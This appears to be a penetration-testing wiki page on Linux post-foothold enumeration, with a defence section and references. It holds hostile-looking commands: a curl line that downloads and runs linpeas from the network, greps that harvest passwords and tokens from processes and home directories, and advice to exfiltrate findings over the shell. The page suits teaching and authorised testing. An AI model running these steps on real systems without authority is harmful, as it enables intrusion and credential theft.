---
title: Linux host enumeration
slug: linux-enumeration
---

> **TL;DR:** After a foothold, run an automated scanner like `linpeas` for breadth, then manually triage the high-signal areas it can miss — credentials in process args, mount options, capabilities, custom suid binaries.

## What it is
Post-foothold enumeration is the systematic collection of facts about a Linux host that turn into privilege escalation, lateral movement, or persistence. The goal is to be exhaustive but quiet — read-only operations, no compiler invocations, no network noise unless explicitly authorised.

## Preconditions / where it applies
- An interactive or semi-interactive shell as a non-root user
- Ability to upload a small static binary (or use built-ins only when you can't)
- A scratch dir that is on a non-noexec mount — usually `/dev/shm`, `/tmp`, sometimes `/var/tmp`

## Technique

**Step 1 — system fingerprint:**
```bash
uname -a; cat /etc/os-release; cat /proc/version
hostnamectl 2>/dev/null
id; groups; sudo -l 2>/dev/null
mount; df -hT
```

**Step 2 — automated scanners** (in order of preference):
- `linpeas.sh` — broadest checks, colour-coded by impact, ~10s on most hosts
- `linux-smart-enumeration` (lse) — quieter, level-tunable output
- `linux-exploit-suggester` — kernel-CVE focused
- `pspy` — passive `procfs` monitor for cron, transient roots, leaked args

```bash
# Fetch into tmpfs (avoid noexec)
curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o /dev/shm/p.sh
chmod +x /dev/shm/p.sh && /dev/shm/p.sh -a | tee /dev/shm/p.out
```

**Step 3 — the high-signal manual checks linpeas can miss:**

```bash
# Credentials in process arguments
ps auxwwf | grep -iE 'pass|pwd|token|key|secret'

# Listening services (root daemons reachable on localhost)
ss -tlnp 2>/dev/null; ss -tlnpu 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Setuid / setgid (including unusual paths)
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# Writable files in suspicious places
find / -writable -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null | head -50

# Cron and timers
cat /etc/crontab /etc/cron.d/* 2>/dev/null
systemctl list-timers --all

# Mounts (NFS, fuse, bind, noexec/nosuid)
cat /proc/mounts
cat /etc/fstab

# Network neighbours (lateral)
ip -4 a; ip route; arp -an 2>/dev/null
cat /etc/hosts ~/.ssh/known_hosts 2>/dev/null

# Dotfiles, history, config leftovers
ls -la ~ /home/* /root 2>/dev/null
grep -RIn -e 'password' -e 'token' -e 'api_key' ~/. /opt /var/www 2>/dev/null

# Containers
cat /proc/1/cgroup; ls -la /var/run/docker.sock /run/containerd 2>/dev/null
```

**Step 4 — record then act.** Save scanner output and your own findings to `/dev/shm`, exfil with `tar | base64` over the shell channel. Build an exploitation hypothesis ranked by likelihood and impact before firing anything that writes to disk or kernel.

## Detection and defence
- EDR/auditd should flag `linpeas`-pattern bulk reads (`find / -perm`, mass `cat /proc/*/status`)
- Watch `/dev/shm` and `/tmp` for new executables; mount with `noexec,nosuid` where workload permits
- Process-arg secrets are the easiest win — move to env files / secret managers, audit with `auditd` `proctitle`
- Shell-history forwarding (`PROMPT_COMMAND` shipping to syslog) catches the manual phase

## References
- [HackTricks — Linux Privilege Escalation Checklist](https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html) — comprehensive triage list
- [PEASS-ng / linpeas](https://github.com/peass-ng/PEASS-ng) — the de-facto scanner
- [pspy](https://github.com/DominicBreuker/pspy) — passive process snooper for cron/secret args

Related: [[linux-privesc-vectors]], [[cron-jobs]], [[suid-sgid-binaries]], [[capabilities-privesc]].
